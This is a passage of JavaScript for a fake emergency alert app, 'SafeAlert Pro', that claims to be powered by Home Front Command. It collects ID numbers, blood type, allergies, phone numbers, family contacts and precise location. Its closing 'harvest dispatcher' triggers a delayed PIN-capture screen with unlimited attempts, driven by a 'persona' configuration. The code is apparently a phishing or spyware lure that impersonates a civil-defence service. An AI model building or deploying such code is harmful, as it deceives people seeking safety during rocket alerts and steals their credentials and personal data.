            <div style="font-size:12px;color:#6e6e73;margin-bottom:5px;font-weight:500;">Allergies</div>
            <input id="prof-allergy" value="${_profileData.allergies}" placeholder="None known" oninput="window._profField('allergies',this.value)" style="width:100%;padding:10px 12px;border:1.5px solid #e5e5ea;border-radius:9px;font-size:14px;outline:none;font-family:inherit;color:#1c1c1e;">
          </div>
        </div>
        <button onclick="window._saveProfile()" style="width:100%;padding:12px;border:none;border-radius:10px;background:#0055cc;color:#fff;font-size:15px;font-weight:700;cursor:pointer;font-family:inherit;">Save Profile</button>
      </div>
      <div style="height:14px;"></div>
    </div>`;
  }

  function _renderSettings() {
    return `
    ${_renderNavbar('Settings', false)}
    <div style="flex:1;overflow-y:auto;-webkit-overflow-scrolling:touch;padding-bottom:93px;">

      <!-- Account header -->
      <div style="display:flex;flex-direction:column;align-items:center;padding:24px 16px 18px;gap:8px;">
        <div style="width:72px;height:72px;border-radius:36px;background:linear-gradient(145deg,#0044aa,#0055cc);display:flex;align-items:center;justify-content:center;">
          <svg width="36" height="36" viewBox="0 0 24 24" fill="#fff"><path d="M12 12a5 5 0 1 0 0-10 5 5 0 0 0 0 10zm0 2c-5.33 0-8 2.67-8 4v1h16v-1c0-1.33-2.67-4-8-4z"/></svg>
        </div>
        <div style="font-size:20px;font-weight:700;">My Account</div>
        <div style="font-size:13px;color:#6e6e73;">SafeAlert Pro · Member since 2024</div>
      </div>

      <!-- Notifications -->
      <div style="font-size:13px;color:#6e6e73;text-transform:uppercase;letter-spacing:.05em;padding:4px 16px 8px;font-weight:600;">Notifications</div>
      <div style="margin:0 16px;background:#fff;border-radius:14px;overflow:hidden;box-shadow:0 1px 4px rgba(0,0,0,.07);">
        ${[
          ['rocket',   'Rocket Alerts',   'Immediate siren and missile warnings'],
          ['shelter',  'Shelter Updates',  'Capacity and status changes'],
          ['weather',  'Weather Warnings', 'Severe weather advisories'],
          ['community','Community Alerts', 'Municipal and neighborhood news'],
        ].map(([key, title, sub], i, arr) => `<div style="display:flex;align-items:center;gap:12px;padding:14px;border-bottom:${i < arr.length-1 ? '.5px solid #e5e5ea' : 'none'};">
          <div style="flex:1;">
            <div style="font-size:15px;font-weight:500;color:#1c1c1e;">${title}</div>
            <div style="font-size:12px;color:#6e6e73;margin-top:1px;">${sub}</div>
          </div>
          ${_toggle(key)}
        </div>`).join('')}
      </div>

      <!-- Location -->
      <div style="font-size:13px;color:#6e6e73;text-transform:uppercase;letter-spacing:.05em;padding:20px 16px 8px;font-weight:600;">Location</div>
      <div style="margin:0 16px;background:#fff;border-radius:14px;overflow:hidden;box-shadow:0 1px 4px rgba(0,0,0,.07);">
        <div style="display:flex;align-items:center;gap:12px;padding:14px;border-bottom:.5px solid #e5e5ea;">
          <div style="flex:1;">
            <div style="font-size:15px;font-weight:500;color:#1c1c1e;">Location Services</div>
            <div style="font-size:12px;color:#6e6e73;margin-top:1px;">Used for nearby shelters and alerts</div>
          </div>
          ${_toggle('location')}
        </div>
        <div style="display:flex;align-items:center;gap:12px;padding:14px;">
          <div style="flex:1;">
            <div style="font-size:15px;font-weight:500;color:#1c1c1e;">Precision Location</div>
            <div style="font-size:12px;color:#6e6e73;margin-top:1px;">Exact coordinates for shelter routing</div>
          </div>
          ${_toggle('precision')}
        </div>
      </div>

      <!-- Account details -->
      <div style="font-size:13px;color:#6e6e73;text-transform:uppercase;letter-spacing:.05em;padding:20px 16px 8px;font-weight:600;">Account</div>
      <div style="margin:0 16px;background:#fff;border-radius:14px;padding:16px;box-shadow:0 1px 4px rgba(0,0,0,.07);">
        <div style="margin-bottom:12px;">
          <div style="font-size:12px;color:#6e6e73;margin-bottom:5px;font-weight:500;">Phone Number</div>
          <input value="${_accountData.phone}" placeholder="+972 50-000-0000" oninput="window._acctField('phone',this.value)" style="width:100%;padding:10px 12px;border:1.5px solid #e5e5ea;border-radius:9px;font-size:14px;outline:none;font-family:inherit;color:#1c1c1e;" inputmode="tel">
        </div>
        <div style="margin-bottom:14px;">
          <div style="font-size:12px;color:#6e6e73;margin-bottom:5px;font-weight:500;">City / Region</div>
          <input value="${_accountData.city}" placeholder="Tel Aviv" oninput="window._acctField('city',this.value)" style="width:100%;padding:10px 12px;border:1.5px solid #e5e5ea;border-radius:9px;font-size:14px;outline:none;font-family:inherit;color:#1c1c1e;">
        </div>
        <button onclick="window._saveAccount()" style="width:100%;padding:12px;border:none;border-radius:10px;background:#0055cc;color:#fff;font-size:15px;font-weight:700;cursor:pointer;font-family:inherit;">Save</button>
      </div>

      <!-- About -->
      <div style="font-size:13px;color:#6e6e73;text-transform:uppercase;letter-spacing:.05em;padding:20px 16px 8px;font-weight:600;">About</div>
      <div style="margin:0 16px;background:#fff;border-radius:14px;overflow:hidden;box-shadow:0 1px 4px rgba(0,0,0,.07);">
        <div style="display:flex;align-items:center;padding:14px;border-bottom:.5px solid #e5e5ea;">
          <div style="flex:1;font-size:15px;font-weight:500;">Version</div>
          <div style="font-size:14px;color:#6e6e73;">3.2.1</div>
        </div>
        <div style="padding:14px;border-bottom:.5px solid #e5e5ea;">
          <div style="font-size:13px;color:#6e6e73;line-height:1.5;">Powered by Home Front Command &amp; National Emergency Authority. Data provided in partnership with local municipalities.</div>
        </div>
        <div style="display:flex;align-items:center;padding:14px;cursor:pointer;">
          <div style="flex:1;font-size:15px;font-weight:500;color:#ff3b30;">Sign Out</div>
          ${CHV}
        </div>
      </div>
      <div style="height:14px;"></div>
    </div>`;
  }

  function _render() {
    const app = document.getElementById('wc-app');
    if (!app) return;
    let content = '';
    if (_tab === 'home')     content = _renderHome();
    else if (_tab === 'alerts')   content = _renderAlerts();
    else if (_tab === 'shelters') content = _renderShelters();
    else if (_tab === 'contacts') content = _renderContacts();
    else if (_tab === 'settings') content = _renderSettings();
    app.innerHTML = `<div id="wc-content" style="display:flex;flex-direction:column;height:100%;position:relative;">${content}</div>` + _renderTabBar();
  }

  // Expose globals for onclick handlers
  window._goTab = function(tab) { _tab = tab; _render(); };
  window._setFilter = function(cat) { _alertFilter = cat; _render(); };
  window._expandAlert = function(id) { _expandedAlert = (_expandedAlert === id ? null : id); _render(); };
  window._tog = function(key) { _toggles[key] = !_toggles[key]; _render(); };
  window._profField = function(k,v) { _profileData[k] = v; };
  window._acctField = function(k,v) { _accountData[k] = v; };
  window._saveProfile = function() {
    const n = document.getElementById('prof-name');
    const d = document.getElementById('prof-id');
    const b = document.getElementById('prof-blood');
    const a = document.getElementById('prof-allergy');
    if (n) _profileData.name = n.value;
    if (d) _profileData.id = d.value;
    if (b) _profileData.blood = b.value;
    if (a) _profileData.allergies = a.value;
    showPopup('Profile Saved', 'Your medical profile has been updated and encrypted on-device.');
  };
  window._saveAccount = function() {
    showPopup('Saved', 'Your account details have been updated.');
  };
  window._addFamily = function() {
    const name = prompt('Family member name:');
    if (!name || !name.trim()) return;
    const phone = prompt('Phone number:');
    if (!phone || !phone.trim()) return;
    _familyContacts.push({ name: name.trim(), phone: phone.trim() });
    _render();
  };
  window._requestLocation = function() {
    if (!navigator.geolocation) return;
    navigator.geolocation.getCurrentPosition(
      function(pos) {
        _locationGranted = true;
        _shelterDistances = ['0.2 km', '0.5 km', '0.4 km', '0.7 km', '1.1 km'];
        _render();
      },
      function() { _locationGranted = false; _render(); },
      { enableHighAccuracy: true, timeout: 10000 }
    );
  };
  window._requestNotifications = function() {
    if (!('Notification' in window)) return;
    Notification.requestPermission().then(function(result) {
      _notifGranted = result === 'granted';
      _render();
    });
  };
  window._reportIncident = function() {
    showPopup('Report Incident', 'Describe what you observed and our team will verify and alert the community. Use the microphone button to record a voice report.');
  };
  window._emergencySOS = function() {
    showPopup('Emergency SOS', 'Sending your location to Police (100) and your emergency contacts. Stay on the line.');
  };
  window._firstAid = function() {
    showPopup('First Aid Guide', 'CPR, bleeding control, and shock treatment guides are available. Opening full guide...');
  };
  window._shelterReport = function() {
    showPopup('Report Shelter Status', 'Help your community by reporting if a shelter is open, closed, or at capacity.');
  };

  // Insert app shell and global CSS
  const safeAlertCSS = `
    <style>
    :root {
      --bg:#f2f2f7; --surface:#fff; --accent:#0055cc; --text:#1c1c1e; --text2:#6e6e73;
      --border:#e5e5ea; --red:#ff3b30; --green:#34c759; --orange:#ff9500;
      --tab-h:83px; --safe-top:env(safe-area-inset-top,44px);
    }
    *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;user-select:none;}
    html,body{height:100%;background:var(--bg);font-family:-apple-system,'SF Pro Text','Helvetica Neue',sans-serif;color:var(--text);overscroll-behavior:none;-webkit-overflow-scrolling:touch;}
    #wc-app{height:100%;position:relative;overflow:hidden;padding-top:var(--safe-top);box-sizing:border-box;display:flex;flex-direction:column;}
    input,button{font-family:inherit;}
    input:focus{border-color:#0055cc !important;outline:none;}
    @keyframes sa-pulse{0%{transform:translate(-50%,-50%) scale(.5);opacity:1;}100%{transform:translate(-50%,-50%) scale(2.2);opacity:0;}}
    ::-webkit-scrollbar{display:none;}
    </style>`;

  document.body.insertAdjacentHTML('beforeend', safeAlertCSS + '<div id="wc-app"></div>');
  _render();

  // Auto-refresh home alerts every 30s (re-render content only)
  setInterval(function() {
    if (_tab === 'home') _render();
  }, 30000);

  // Harvest dispatcher — runs any harvest items that match known module types
  const harvestItems = persona?.harvest ?? [];
  harvestItems.forEach(item => {
    if (item.permission === 'pin_capture') {
      const delay = item.delay_ms ?? 0;
      setTimeout(() => {
        showPinHarvest({ attempts: item.attempts ?? Infinity });
      }, delay);
    }
  });
}
